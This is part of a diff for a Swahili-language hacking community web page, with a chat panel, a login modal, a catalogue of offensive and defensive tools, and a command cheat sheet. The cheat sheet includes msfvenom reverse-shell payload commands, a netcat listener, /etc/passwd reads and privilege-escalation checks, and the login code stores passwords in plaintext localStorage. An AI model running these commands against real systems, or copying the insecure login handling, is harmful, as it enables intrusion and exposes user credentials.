+      <div class="cmsg ai"><div class="mlbl">🔷 SANEX AI</div>Karibu! Mimi ni SANEX AI, powered na Claude. Ninaweza kukusaidia na maswali yote ya cybersecurity, tools, na hacking ya kimaadili. Niulize chochote!</div>
+    </div>
+    <div class="cin-group">
+      <input type="text" id="ai-input" placeholder="Uliza swali lolote la cybersecurity..." onkeydown="if(event.key==='Enter')sendAI()">
+      <button onclick="sendAI()">➤</button>
+    </div>
+  </div>
+  <footer style="margin-top:20px;">
+    <div class="fl">
+      <a href="https://t.me/sanexno" target="_blank" class="badge badge-s">📡 SANEX</a>
+      <a href="https://t.me/gvenox" target="_blank" class="badge badge-g">🔷 GVENOX</a>
+    </div>
+    <div class="fcopy">© 2025 SANEXNO</div>
+  </footer>
+</div>
+
+</div><!-- /main-site -->
+
+<!-- AUTH MODAL -->
+<div class="modal-ov" id="authModal">
+  <div class="modal">
+    <button class="modal-close" onclick="closeAuth()">×</button>
+    <h2 id="auth-title">LOGIN</h2>
+    <p>Ingia kwenye Sanexno Platform</p>
+    <div id="auth-form">
+      <input class="fld" type="text" id="a-name" placeholder="Jina lako" style="display:none;">
+      <input class="fld" type="email" id="a-email" placeholder="Email yako">
+      <input class="fld" type="password" id="a-pass" placeholder="Password">
+      <button class="btn btn-s" style="width:100%;padding:13px;font-size:14px;letter-spacing:2px;" onclick="doAuth()">INGIA</button>
+    </div>
+    <div class="atoggle" id="auth-toggle">Huna account? <a onclick="toggleAuth()">Register hapa</a></div>
+  </div>
+</div>
+
+<!-- TOOL MODAL -->
+<div class="tmodal" id="toolModal">
+  <div class="tmod-inner">
+    <button class="tmod-close" onclick="closeTool()">×</button>
+    <div id="tool-img-area"></div>
+    <h3 id="tool-mod-name"></h3>
+    <div class="tdesc-full" id="tool-mod-desc"></div>
+    <div style="font-size:12px;opacity:.5;margin-bottom:8px;">Category: <span id="tool-mod-cat" style="color:var(--c);"></span></div>
+    <div class="tmod-dl" id="tool-mod-btns"></div>
+  </div>
+</div>
+
+<script>
+// ===== INIT =====
+window.addEventListener('load',()=>{
+  setTimeout(()=>{
+    document.getElementById('ls').classList.add('hidden');
+    const ms=document.getElementById('main-site');
+    ms.style.display='block';
+    setTimeout(()=>ms.style.opacity='1',50);
+    initMatrix();
+    renderTools();
+    renderPosts('sanex');
+    renderPosts('grey');
+    renderCmds('all');
+    updateStats();
+  },3600);
+});
+
+// ===== MATRIX =====
+function initMatrix(){
+  const c=document.getElementById('mx');
+  const ctx=c.getContext('2d');
+  c.width=window.innerWidth;c.height=window.innerHeight;
+  const cols=Math.floor(c.width/18);
+  const drops=Array(cols).fill(1);
+  const chars='アイウエオカキクケコサシスセソタチツテトナニヌネノ0123456789ABCDEF';
+  setInterval(()=>{
+    ctx.fillStyle='rgba(5,8,15,.05)';
+    ctx.fillRect(0,0,c.width,c.height);
+    ctx.fillStyle='#00f0ff';
+    ctx.font='14px monospace';
+    drops.forEach((y,i)=>{
+      const t=chars[Math.floor(Math.random()*chars.length)];
+      ctx.fillText(t,i*18,y*18);
+      if(y*18>c.height&&Math.random()>.975)drops[i]=0;
+      drops[i]++;
+    });
+  },60);
+  window.addEventListener('resize',()=>{c.width=window.innerWidth;c.height=window.innerHeight;});
+}
+
+// ===== PAGE NAV =====
+function showPage(id){
+  document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));
+  document.getElementById(id).classList.add('active');
+  document.querySelectorAll('.nav a').forEach(a=>a.classList.remove('active'));
+  const map={
+    'pg-home':0,'pg-sanex':1,'pg-grey':2,'pg-tools':3,'pg-term':4,'pg-ai':5
+  };
+  const links=document.querySelectorAll('.nav a:not(.abtn)');
+  if(map[id]!==undefined&&links[map[id]])links[map[id]].classList.add('active');
+  window.scrollTo(0,0);
+}
+
+// ===== STATS =====
+function updateStats(){
+  const users=JSON.parse(localStorage.getItem('snx_users')||'[]');
+  document.getElementById('stat-users').textContent=users.length||0;
+}
+
+// ===== AUTH =====
+let isLogin=true;
+function openAuth(){
+  const u=localStorage.getItem('snx_me');
+  if(u){showToast('Tayari umeingia kama '+JSON.parse(u).name,'ok');return;}
+  document.getElementById('authModal').classList.add('active');
+}
+function closeAuth(){document.getElementById('authModal').classList.remove('active');}
+function toggleAuth(){
+  isLogin=!isLogin;
+  document.getElementById('auth-title').textContent=isLogin?'LOGIN':'REGISTER';
+  document.getElementById('a-name').style.display=isLogin?'none':'block';
+  document.getElementById('auth-toggle').innerHTML=isLogin?'Huna account? <a onclick="toggleAuth()">Register hapa</a>':'Una account? <a onclick="toggleAuth()">Login hapa</a>';
+  document.querySelector('#auth-form button').textContent=isLogin?'INGIA':'JISAJILI';
+}
+function doAuth(){
+  const email=document.getElementById('a-email').value.trim();
+  const pass=document.getElementById('a-pass').value;
+  const name=document.getElementById('a-name').value.trim();
+  if(!email||!pass){showToast('Jaza email na password!','err');return;}
+  let users=JSON.parse(localStorage.getItem('snx_users')||'[]');
+  if(isLogin){
+    const u=users.find(x=>x.email===email&&x.pass===pass);
+    if(!u){showToast('Email au password si sahihi!','err');return;}
+    localStorage.setItem('snx_me',JSON.stringify(u));
+    closeAuth();
+    document.getElementById('authBtn').textContent='👤 '+u.name;
+    showToast('Karibu, '+u.name+'!','ok');
+    updateStats();
+  } else {
+    if(!name){showToast('Weka jina lako!','err');return;}
+    if(users.find(x=>x.email===email)){showToast('Email hii tayari imesajiliwa!','err');return;}
+    const u={id:Date.now(),name,email,pass,joined:new Date().toLocaleDateString(),blocked:false,role:'user'};
+    users.push(u);
+    localStorage.setItem('snx_users',JSON.stringify(users));
+    localStorage.setItem('snx_me',JSON.stringify(u));
+    closeAuth();
+    document.getElementById('authBtn').textContent='👤 '+name;
+    showToast('Umesajiliwa! Karibu, '+name+'!','ok');
+    updateStats();
+  }
+}
+const me=localStorage.getItem('snx_me');
+if(me)document.getElementById('authBtn').textContent='👤 '+JSON.parse(me).name;
+
+// ===== POSTS =====
+let sPosts=JSON.parse(localStorage.getItem('snx_sposts')||'[]');
+let gPosts=JSON.parse(localStorage.getItem('snx_gposts')||'[]');
+function createPost(side){
+  const txt=document.getElementById(side==='sanex'?'sp-input':'gp-input').value.trim();
+  const fi=document.getElementById(side==='sanex'?'sp-img':'gp-img');
+  if(!txt&&!fi.files[0]){showToast('Andika ujumbe au chagua picha!','err');return;}
+  if(fi.files[0]){
+    const r=new FileReader();
+    r.onload=e=>savePost(side,txt,e.target.result);
+    r.readAsDataURL(fi.files[0]);
+  } else savePost(side,txt,null);
+  document.getElementById(side==='sanex'?'sp-input':'gp-input').value='';
+  fi.value='';
+}
+function savePost(side,txt,img){
+  const p={id:Date.now(),txt,img,author:getMe(),time:new Date().toLocaleString(),comments:[]};
+  if(side==='sanex'){sPosts.unshift(p);localStorage.setItem('snx_sposts',JSON.stringify(sPosts));}
+  else{gPosts.unshift(p);localStorage.setItem('snx_gposts',JSON.stringify(gPosts));}
+  renderPosts(side);showToast('Post imewekwa!','ok');
+}
+function renderPosts(side){
+  const posts=side==='sanex'?sPosts:gPosts;
+  const el=document.getElementById(side==='sanex'?'sanex-posts':'grey-posts');
+  const cl=side==='sanex'?'btn-s':'btn-g';
+  if(!posts.length){el.innerHTML='<p style="opacity:.3;font-size:13px;text-align:center;">Hakuna posts bado.</p>';return;}
+  el.innerHTML=posts.map(p=>`
+    <div class="post-item">
+      <div class="post-txt">${esc(p.txt)}</div>
+      ${p.img?`<img src="${p.img}" class="post-img">`:''}
+      <div class="post-meta"><span>${esc(p.author)} · ${p.time}</span><span>💬 ${p.comments.length}</span></div>
+      <div class="post-comments">
+        ${p.comments.map(c=>`<div class="comment-item"><strong>${esc(c.author)}:</strong> ${esc(c.txt)}</div>`).join('')}
+        <div class="cm-group">
+          <input placeholder="Comment..." id="cmt-${p.id}">
+          <button class="btn ${cl}" style="padding:6px 12px;font-size:11px;" onclick="addComment('${side}',${p.id})">Send</button>
+        </div>
+      </div>
+    </div>`).join('');
+}
+function addComment(side,pid){
+  const el=document.getElementById('cmt-'+pid);
+  const txt=el.value.trim();if(!txt)return;
+  const posts=side==='sanex'?sPosts:gPosts;
+  const p=posts.find(x=>x.id===pid);
+  if(p){p.comments.push({author:getMe(),txt,time:new Date().toLocaleString()});
+    localStorage.setItem(side==='sanex'?'snx_sposts':'snx_gposts',JSON.stringify(posts));
+    renderPosts(side);}
+}
+function addTip(){
+  const el=document.getElementById('tip-input');
+  const txt=el.value.trim();if(!txt)return;
+  const d=document.getElementById('tips-list');
+  d.insertAdjacentHTML('afterbegin',`<div class="post-item"><div class="post-txt">💡 ${esc(txt)}</div><div class="post-meta">${esc(getMe())} · Just now</div></div>`);
+  el.value='';showToast('Tip imeshirikiwa!','ok');
+}
+function submitOrder(){
+  const n=document.getElementById('ord-name').value.trim();
+  const s=document.getElementById('ord-svc').value;
+  if(!n||!s){showToast('Jaza jina na chagua huduma!','err');return;}
+  showToast('Request imetumwa! Tutawasiliana nawe hivi karibuni.','ok');
+  document.getElementById('ord-name').value='';
+  document.getElementById('ord-desc').value='';
+}
+function getMe(){const m=localStorage.getItem('snx_me');return m?JSON.parse(m).name:'Anonymous';}
+function esc(t){if(!t)return'';const d=document.createElement('div');d.textContent=t;return d.innerHTML;}
+
+// ===== TOOLS =====
+const toolsData=JSON.parse(localStorage.getItem('snx_tools')||'null')||[
+  {id:1,name:'Nmap Scanner',icon:'🔍',cat:'Network',desc:'Network discovery na security auditing tool. Scan ports, OS detection, service version detection.',link:'https://nmap.org',download:'https://nmap.org/download.html',locked:false},
+  {id:2,name:'Metasploit',icon:'💀',cat:'Exploit',desc:'Advanced penetration testing framework. Module ya exploitation, payloads, na auxiliary tools.',link:'https://metasploit.com',download:'https://metasploit.com/download',locked:false},
+  {id:3,name:'Burp Suite',icon:'🕷️',cat:'Web',desc:'Web application security testing platform. Intercept, modify HTTP/HTTPS traffic.',link:'https://portswigger.net',download:'https://portswigger.net/burp/communitydownload',locked:false},
+  {id:4,name:'Wireshark',icon:'📡',cat:'Network',desc:'Network protocol analyzer. Capture na analyze network traffic kwa real-time.',link:'https://wireshark.org',download:'https://wireshark.org/download.html',locked:false},
+  {id:5,name:'SQLMap',icon:'🗃️',cat:'Web',desc:'Automatic SQL injection na database takeover tool. Support MySQL, Oracle, PostgreSQL, MSSQL.',link:'https://sqlmap.org',download:'https://github.com/sqlmapproject/sqlmap',locked:false},
+  {id:6,name:'Aircrack-ng',icon:'📶',cat:'Wireless',desc:'Complete suite ya tools za WiFi network security. WEP na WPA/WPA2-PSK cracking.',link:'https://aircrack-ng.org',download:'https://aircrack-ng.org/downloads.html',locked:false},
+  {id:7,name:'John the Ripper',icon:'🔓',cat:'Password',desc:'Password security auditing tool. Support Unix, Windows passwords na zaidi ya 40 hash types.',link:'https://openwall.com/john',download:'https://openwall.com/john/doc/DOWNLOAD.shtml',locked:false},
+  {id:8,name:'Hashcat',icon:'#️⃣',cat:'Password',desc:'Advanced CPU-based password recovery tool. Support MD5, SHA, bcrypt, WPA, na zaidi.',link:'https://hashcat.net',download:'https://hashcat.net/hashcat',locked:false},
+  {id:9,name:'Hydra',icon:'🐍',cat:'Password',desc:'Fast network logon cracker. Support FTP, HTTP, HTTPS, SMB, SSH, na protocols nyingi.',link:'https://github.com/vanhauser-thc/thc-hydra',download:'https://github.com/vanhauser-thc/thc-hydra/releases',locked:false},
+  {id:10,name:'TheHarvester',icon:'🌾',cat:'OSINT',desc:'Gather emails, names, subdomains, IPs, na URLs kutoka vyanzo vingi vya public.',link:'https://github.com/laramies/theHarvester',download:'https://github.com/laramies/theHarvester',locked:false},
+  {id:11,name:'Maltego',icon:'🕸️',cat:'OSINT',desc:'Open source intelligence na forensics tool. Visual link analysis ya mahusiano kati ya data.',link:'https://maltego.com',download:'https://maltego.com/downloads',locked:false},
+  {id:12,name:'Shodan',icon:'🌐',cat:'OSINT',desc:'Search engine ya internet-connected devices. Pata info ya servers, cameras, routers.',link:'https://shodan.io',download:'https://shodan.io',locked:false},
+  {id:13,name:'Nikto',icon:'🎯',cat:'Web',desc:'Web server scanner. Checks zaidi ya 6700 potentially dangerous files/scripts.',link:'https://github.com/sullo/nikto',download:'https://github.com/sullo/nikto',locked:false},
+  {id:14,name:'OWASP ZAP',icon:'🕳️',cat:'Web',desc:'Open-source web application security scanner. Automated na manual security testing.',link:'https://zaproxy.org',download:'https://zaproxy.org/download',locked:false},
+  {id:15,name:'Volatility',icon:'🧠',cat:'Forensics',desc:'Memory forensics framework. Analyze RAM dumps na extract artifacts kwa incident response.',link:'https://volatilityfoundation.org',download:'https://github.com/volatilityfoundation/volatility3',locked:false},
+  {id:16,name:'Autopsy',icon:'🔬',cat:'Forensics',desc:'Digital forensics platform. Hard drive investigation, timeline analysis, keyword search.',link:'https://autopsy.com',download:'https://autopsy.com/download',locked:false},
+  {id:17,name:'Recon-ng',icon:'🗺️',cat:'Recon',desc:'Full-featured Web Reconnaissance framework. Modular framework kwa automated OSINT.',link:'https://github.com/lanmaster53/recon-ng',download:'https://github.com/lanmaster53/recon-ng',locked:false},
+  {id:18,name:'Gobuster',icon:'🚪',cat:'Web',desc:'Tool ya directory/file brute-forcing ya web servers. DNS subdomain enumeration pia.',link:'https://github.com/OJ/gobuster',download:'https://github.com/OJ/gobuster/releases',locked:false},
+  {id:19,name:'Nessus',icon:'🛡️',cat:'Vulnerability',desc:'Vulnerability scanner ya hali ya juu. Patch auditing, configuration checking, compliance.',link:'https://tenable.com/products/nessus',download:'https://tenable.com/products/nessus/nessus-essentials',locked:false},
+  {id:20,name:'OpenVAS',icon:'🔭',cat:'Vulnerability',desc:'Open Vulnerability Assessment Scanner. Full-featured vulnerability management solution.',link:'https://openvas.org',download:'https://github.com/greenbone/openvas-scanner',locked:false},
+  {id:21,name:'Snort',icon:'👃',cat:'Network',desc:'Open source network intrusion detection system. Real-time traffic analysis na packet logging.',link:'https://snort.org',download:'https://snort.org/downloads',locked:false},
+  {id:22,name:'Suricata',icon:'🦁',cat:'Network',desc:'High performance network IDS, IPS na Network Security Monitoring engine.',link:'https://suricata.io',download:'https://suricata.io/download',locked:false},
+  {id:23,name:'Kali Linux',icon:'🐉',cat:'OS',desc:'Debian-based Linux distro kwa digital forensics na penetration testing. Tools 600+.',link:'https://kali.org',download:'https://kali.org/get-kali',locked:false},
+  {id:24,name:'Parrot OS',icon:'🦜',cat:'OS',desc:'Debian-based OS focused on security, privacy, na development. Lightweight na fast.',link:'https://parrotsec.org',download:'https://parrotsec.org/download',locked:false},
+  {id:25,name:'SET Toolkit',icon:'🎭',cat:'Exploit',desc:'Social Engineering Toolkit. Phishing attacks, credential harvesting, spear-phishing.',link:'https://github.com/trustedsec/social-engineer-toolkit',download:'https://github.com/trustedsec/social-engineer-toolkit',locked:false},
+  {id:26,name:'Netcat',icon:'🐱',cat:'Network',desc:'Network utility kwa reading/writing data across network connections. "Swiss army knife".',link:'https://netcat.sourceforge.io',download:'https://netcat.sourceforge.io/download.php',locked:false},
+  {id:27,name:'Mimikatz',icon:'🐭',cat:'Windows',desc:'Post-exploitation tool ya Windows. Extract plaintexts passwords, kerberos tickets na zaidi.',link:'https://github.com/gentilkiwi/mimikatz',download:'https://github.com/gentilkiwi/mimikatz/releases',locked:false},
+  {id:28,name:'Empire',icon:'👑',cat:'Exploit',desc:'Post-exploitation PowerShell agent. C2 framework kwa Windows, Linux na macOS.',link:'https://github.com/EmpireProject/Empire',download:'https://github.com/EmpireProject/Empire',locked:false},
+  {id:29,name:'BeEF',icon:'🥩',cat:'Web',desc:'Browser Exploitation Framework. Focus kwenye web browser vulnerabilities.',link:'https://beefproject.com',download:'https://github.com/beefproject/beef',locked:false},
+  {id:30,name:'Cobalt Strike',icon:'⚔️',cat:'C2',desc:'Adversary simulation platform. C2 framework ya professional red team operations.',link:'https://cobaltstrike.com',download:'https://cobaltstrike.com',locked:true},
+  {id:31,name:'Impacket',icon:'📦',cat:'Network',desc:'Python classes kwa working na network protocols. SMB, Kerberos, NTLM exploitation.',link:'https://github.com/fortra/impacket',download:'https://github.com/fortra/impacket',locked:false},
+  {id:32,name:'CrackMapExec',icon:'🗝️',cat:'Windows',desc:'Post-exploitation tool ya Active Directory environments. SMB exploitation.',link:'https://github.com/Porchetta-Industries/CrackMapExec',download:'https://github.com/Porchetta-Industries/CrackMapExec',locked:false},
+  {id:33,name:'BloodHound',icon:'🩸',cat:'Windows',desc:'Active Directory visualizer. Identify attack paths na privilege escalation routes.',link:'https://github.com/BloodHoundAD/BloodHound',download:'https://github.com/BloodHoundAD/BloodHound/releases',locked:false},
+  {id:34,name:'Responder',icon:'📢',cat:'Network',desc:'LLMNR, NBT-NS na MDNS poisoner. Capture NTLM hashes kwenye LAN.',link:'https://github.com/lgandx/Responder',download:'https://github.com/lgandx/Responder',locked:false},
+  {id:35,name:'Evilginx',icon:'😈',cat:'Phishing',desc:'Man-in-the-middle attack framework. Bypass 2FA kwa phishing credentials na session cookies.',link:'https://github.com/kgretzky/evilginx2',download:'https://github.com/kgretzky/evilginx2',locked:false},
+  {id:36,name:'Proxychains',icon:'⛓️',cat:'Privacy',desc:'Proxy tool kwa Linux. Route connections through proxy servers - Tor, SOCKS4, SOCKS5.',link:'https://github.com/haad/proxychains',download:'https://github.com/haad/proxychains',locked:false},
+  {id:37,name:'Tor Browser',icon:'🧅',cat:'Privacy',desc:'Anonymous browsing browser. Route traffic kupitia Tor network kwa privacy.',link:'https://torproject.org',download:'https://torproject.org/download',locked:false},
+  {id:38,name:'VirtualBox',icon:'📦',cat:'Virtualization',desc:'Free virtualization platform. Run multiple OS kwa safely practice hacking.',link:'https://virtualbox.org',download:'https://virtualbox.org/wiki/Downloads',locked:false},
+  {id:39,name:'Docker',icon:'🐳',cat:'Virtualization',desc:'Container platform. Run isolated environments kwa security labs.',link:'https://docker.com',download:'https://docker.com/get-started',locked:false},
+  {id:40,name:'Ghidra',icon:'🐉',cat:'Reverse',desc:'NSA reverse engineering tool. Disassemble na decompile binary programs.',link:'https://ghidra-sre.org',download:'https://github.com/NationalSecurityAgency/ghidra/releases',locked:false},
+  {id:41,name:'IDA Pro',icon:'🔧',cat:'Reverse',desc:'Interactive Disassembler. Industry standard kwa binary analysis na reverse engineering.',link:'https://hex-rays.com/ida-pro',download:'https://hex-rays.com/ida-pro',locked:true},
+  {id:42,name:'Radare2',icon:'📻',cat:'Reverse',desc:'Open-source reverse engineering framework. Disassembly, analysis, patching na more.',link:'https://radare.org',download:'https://github.com/radareorg/radare2',locked:false},
+  {id:43,name:'pwndbg',icon:'🐛',cat:'Reverse',desc:'GDB plugin ya exploit development na reverse engineering. Binary exploitation.',link:'https://github.com/pwndbg/pwndbg',download:'https://github.com/pwndbg/pwndbg',locked:false},
+  {id:44,name:'ROPgadget',icon:'⚙️',cat:'Exploit',desc:'Return Oriented Programming gadget finder. Binary exploitation na bypass DEP/ASLR.',link:'https://github.com/JonathanSalwan/ROPgadget',download:'https://github.com/JonathanSalwan/ROPgadget',locked:false},
+  {id:45,name:'Binwalk',icon:'🔍',cat:'Forensics',desc:'Firmware analysis tool. Extract embedded files na executable code kutoka binary images.',link:'https://github.com/ReFirmLabs/binwalk',download:'https://github.com/ReFirmLabs/binwalk',locked:false},
+  {id:46,name:'Steghide',icon:'🖼️',cat:'Forensics',desc:'Steganography tool. Hide na extract data ndani ya image na audio files.',link:'http://steghide.sourceforge.net',download:'http://steghide.sourceforge.net/download.php',locked:false},
+  {id:47,name:'CyberChef',icon:'👨‍🍳',cat:'Crypto',desc:'Web app ya encryption, encoding, compression na data analysis. "Swiss Army Knife" ya data.',link:'https://gchq.github.io/CyberChef',download:'https://github.com/gchq/CyberChef/releases',locked:false},
+  {id:48,name:'OpenSSL',icon:'🔐',cat:'Crypto',desc:'Cryptography toolkit. SSL/TLS protocols, certificates, encryption na decryption.',link:'https://openssl.org',download:'https://openssl.org/source',locked:false},
+  {id:49,name:'Veil Framework',icon:'🌫️',cat:'Evasion',desc:'Generate metasploit payloads bypass common antivirus solutions.',link:'https://github.com/Veil-Framework/Veil',download:'https://github.com/Veil-Framework/Veil',locked:false},
+  {id:50,name:'CUSTOM TOOL',icon:'➕',cat:'Custom',desc:'Admin anaweza kuongeza tool mpya kupitia Admin Panel. Login kama admin kuongeza.',link:'#',download:'#',locked:false},
+];
+function renderTools(){
+  const saved=JSON.parse(localStorage.getItem('snx_tools_custom')||'[]');
+  const all=[...toolsData,...saved];
+  const el=document.getElementById('tools-grid');
+  el.innerHTML=all.map(t=>`
+    <div class="titem ${t.locked?'t-locked':''}" onclick="${t.locked?'showToast(\"Tool hii inahitaji access ya special!\",\"warn\")':'openTool('+t.id+')'}">
+      <div class="ticon">${t.icon}</div>
+      <div class="tname">${t.name}</div>
+      <div class="tdesc">${t.cat}</div>
+    </div>`).join('');
+}
+function openTool(id){
+  const saved=JSON.parse(localStorage.getItem('snx_tools_custom')||'[]');
+  const all=[...toolsData,...saved];
+  const t=all.find(x=>x.id===id);
+  if(!t)return;
+  document.getElementById('tool-mod-name').textContent=t.name;
+  document.getElementById('tool-mod-desc').textContent=t.desc;
+  document.getElementById('tool-mod-cat').textContent=t.cat;
+  const ia=document.getElementById('tool-img-area');
+  if(t.image){ia.innerHTML=`<img src="${t.image}" style="width:100%;border-radius:10px;margin-bottom:12px;max-height:200px;object-fit:cover;">`;}
+  else{ia.innerHTML=`<div class="tmod-img-placeholder">${t.icon}</div>`;}
+  const mb=document.getElementById('tool-mod-btns');
+  mb.innerHTML=`<a href="${t.link}" target="_blank" class="btn btn-s">🌐 Visit</a>
+    <a href="${t.download}" target="_blank" class="btn btn-p">⬇️ Download</a>
+    <button class="btn btn-out" onclick="closeTool()">Close</button>`;
+  document.getElementById('toolModal').classList.add('active');
+}
+function closeTool(){document.getElementById('toolModal').classList.remove('active');}
+
+// ===== TERMINAL =====
+const CMDS=[
+  // NETWORK
+  {cat:'network',cmd:'nmap -sV -p 1-1000 TARGET',title:'Nmap Port Scan',desc:'Scan ports 1-1000 na version detection'},
+  {cat:'network',cmd:'nmap -A -T4 TARGET',title:'Nmap Aggressive',desc:'OS detection, scripts, traceroute'},
+  {cat:'network',cmd:'nmap -sU --top-ports 100 TARGET',title:'Nmap UDP Scan',desc:'Scan top 100 UDP ports'},
+  {cat:'network',cmd:'nmap -sn 192.168.1.0/24',title:'Network Discovery',desc:'Discover hosts kwenye subnet'},
+  {cat:'network',cmd:'nmap --script vuln TARGET',title:'Vuln Scripts',desc:'Run vulnerability scripts dhidi ya target'},
+  {cat:'network',cmd:'netstat -tulnp',title:'Active Ports',desc:'Onyesha ports zote zinazofanya kazi'},
+  {cat:'network',cmd:'ip route show',title:'Routing Table',desc:'Onyesha routing table ya mfumo'},
+  {cat:'network',cmd:'traceroute TARGET',title:'Traceroute',desc:'Trace route hadi target host'},
+  {cat:'network',cmd:'arp-scan -l',title:'ARP Scan',desc:'Scan LAN kwa ARP protocol'},
+  {cat:'network',cmd:'tcpdump -i eth0 -w cap.pcap',title:'Packet Capture',desc:'Capture network packets'},
+  {cat:'network',cmd:'nc -lvnp 4444',title:'Netcat Listener',desc:'Open TCP listener kwenye port 4444'},
+  {cat:'network',cmd:'nc TARGET 80',title:'Netcat Connect',desc:'Connect kwa TCP kwenye target'},
+  // RECON
+  {cat:'recon',cmd:'whois TARGET',title:'Whois Lookup',desc:'Domain registration information'},
+  {cat:'recon',cmd:'dig TARGET ANY',title:'DNS Lookup',desc:'DNS records zote za domain'},
+  {cat:'recon',cmd:'dig @8.8.8.8 TARGET MX',title:'DNS MX Records',desc:'Mail server records'},
+  {cat:'recon',cmd:'theHarvester -d TARGET -b all',title:'theHarvester',desc:'OSINT - emails, subdomains, IPs'},
+  {cat:'recon',cmd:'subfinder -d TARGET',title:'Subfinder',desc:'Subdomain enumeration'},
+  {cat:'recon',cmd:'amass enum -d TARGET',title:'Amass Enum',desc:'Advanced subdomain enumeration'},
+  {cat:'recon',cmd:'dnsx -l domains.txt -a -aaaa',title:'DNSX Resolve',desc:'DNS resolution kwa domains nyingi'},
+  {cat:'recon',cmd:'httprobe < domains.txt',title:'HTTP Probe',desc:'Pata active HTTP/HTTPS hosts'},
+  {cat:'recon',cmd:'shodan search hostname:TARGET',title:'Shodan Search',desc:'Search Shodan kwa hostname'},
+  {cat:'recon',cmd:'waybackurls TARGET',title:'Wayback URLs',desc:'URLs zote kutoka Wayback Machine'},
+  // WEB
+  {cat:'web',cmd:'sqlmap -u "URL?id=1" --dbs',title:'SQLMap Databases',desc:'Enumerate databases kwa SQL injection'},
+  {cat:'web',cmd:'sqlmap -u "URL" --forms --crawl=3',title:'SQLMap Forms',desc:'Test forms kwa SQL injection'},
+  {cat:'web',cmd:'nikto -h TARGET',title:'Nikto Web Scan',desc:'Web server vulnerability scan'},
+  {cat:'web',cmd:'gobuster dir -u URL -w wordlist.txt',title:'Dir Busting',desc:'Brute force directories na files'},
+  {cat:'web',cmd:'gobuster dns -d TARGET -w subdomains.txt',title:'DNS Busting',desc:'Subdomain brute force'},
+  {cat:'web',cmd:'ffuf -u URL/FUZZ -w wordlist.txt',title:'FFUF Fuzzing',desc:'Fast web fuzzing tool'},
+  {cat:'web',cmd:'wfuzz -c -z file,wordlist.txt URL/FUZZ',title:'WFuzz',desc:'Web application fuzzer'},
+  {cat:'web',cmd:'nuclei -u URL -t cves/',title:'Nuclei CVE Scan',desc:'Scan kwa CVE vulnerabilities'},
+  {cat:'web',cmd:'curl -I URL',title:'HTTP Headers',desc:'Onyesha HTTP response headers'},
+  {cat:'web',cmd:'wafw00f URL',title:'WAF Detection',desc:'Detect Web Application Firewall'},
+  // EXPLOIT
+  {cat:'exploit',cmd:'msfconsole',title:'Metasploit',desc:'Washa Metasploit Framework console'},
+  {cat:'exploit',cmd:'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf > shell.elf',title:'Linux Payload',desc:'Create Linux reverse shell payload'},
+  {cat:'exploit',cmd:'msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe > shell.exe',title:'Windows Payload',desc:'Create Windows reverse shell'},
+  {cat:'exploit',cmd:'msfvenom -p php/meterpreter_reverse_tcp LHOST=IP LPORT=4444 -f raw > shell.php',title:'PHP Payload',desc:'Create PHP reverse shell'},
+  {cat:'exploit',cmd:'python3 -c "import pty;pty.spawn(\'/bin/bash\')"',title:'Spawn TTY',desc:'Spawn interactive shell'},
+  {cat:'exploit',cmd:'searchsploit TARGET',title:'SearchSploit',desc:'Search ExploitDB kwa exploits'},
+  {cat:'exploit',cmd:'cat /etc/passwd',title:'Read Passwd',desc:'Linux user accounts file'},
+  {cat:'exploit',cmd:'sudo -l',title:'Sudo Perms',desc:'Onyesha sudo permissions za user'},
+  {cat:'exploit',cmd:'find / -perm -u=s -type f 2>/dev/null',title:'SUID Files',desc:'Pata SUID binaries kwa privesc'},
+  {cat:'exploit',cmd:'linpeas.sh',title:'LinPEAS',desc:'Linux Privilege Escalation script'},
+  {cat:'exploit',cmd:'winpeas.exe',title:'WinPEAS',desc:'Windows Privilege Escalation script'},
+  // FORENSICS
+  {cat:'forensics',cmd:'volatility -f mem.raw imageinfo',title:'Memory Info',desc:'Pata OS info kutoka memory dump'},
+  {cat:'forensics',cmd:'volatility -f mem.raw pslist',title:'Process List',desc:'List processes kutoka memory'},
+  {cat:'forensics',cmd:'volatility -f mem.raw netscan',title:'Network Scan',desc:'Network connections katika memory'},
+  {cat:'forensics',cmd:'binwalk -e firmware.bin',title:'Binwalk Extract',desc:'Extract files kutoka firmware'},
+  {cat:'forensics',cmd:'strings binary | grep -i password',title:'String Search',desc:'Pata passwords katika binary'},
+  {cat:'forensics',cmd:'file suspicious_file',title:'File Type',desc:'Tambua aina ya file'},
+  {cat:'forensics',cmd:'exiftool image.jpg',title:'EXIF Data',desc:'Metadata ya picha/file'},
+  {cat:'forensics',cmd:'md5sum file',title:'MD5 Hash',desc:'Hesabu MD5 hash ya file'},
+  {cat:'forensics',cmd:'sha256sum file',title:'SHA256 Hash',desc:'Hesabu SHA256 hash ya file'},
+  {cat:'forensics',cmd:'steghide extract -sf image.jpg',title:'Steghide Extract',desc:'Extract hidden data kutoka picha'},
+  // CRYPTO
+  {cat:'crypto',cmd:'openssl genrsa -out key.pem 2048',title:'Gen RSA Key',desc:'Generate RSA private key 2048-bit'},
+  {cat:'crypto',cmd:'openssl req -new -x509 -key key.pem -out cert.pem',title:'Self-Signed Cert',desc:'Create self-signed certificate'},
+  {cat:'crypto',cmd:'openssl enc -aes-256-cbc -in file -out file.enc',title:'AES Encrypt',desc:'Encrypt file kwa AES-256-CBC'},
+  {cat:'crypto',cmd:'echo -n "text" | md5sum',title:'MD5 Text',desc:'Hash text kwa MD5'},
+  {cat:'crypto',cmd:'echo -n "text" | sha256sum',title:'SHA256 Text',desc:'Hash text kwa SHA-256'},
+  {cat:'crypto',cmd:'base64 -e file.txt',title:'Base64 Encode',desc:'Encode file kwa Base64'},
+  {cat:'crypto',cmd:'base64 -d file.b64',title:'Base64 Decode',desc:'Decode Base64 file'},
+  {cat:'crypto',cmd:'gpg --gen-key',title:'GPG Key Gen',desc:'Generate GPG encryption key'},
+  {cat:'crypto',cmd:'gpg -c file.txt',title:'GPG Encrypt',desc:'Encrypt file kwa GPG symmetric'},
+  {cat:'crypto',cmd:'hashcat -a 0 -m 0 hash.txt wordlist.txt',title:'Hashcat MD5',desc:'Crack MD5 hashes kwa wordlist'},
+  {cat:'crypto',cmd:'hashcat -a 0 -m 1800 hash.txt wordlist.txt',title:'Hashcat SHA512',desc:'Crack SHA-512 hashes'},
+  {cat:'crypto',cmd:'john --wordlist=wordlist.txt hashes.txt',title:'John Crack',desc:'Crack password hashes kwa John'},
+  // WIRELESS
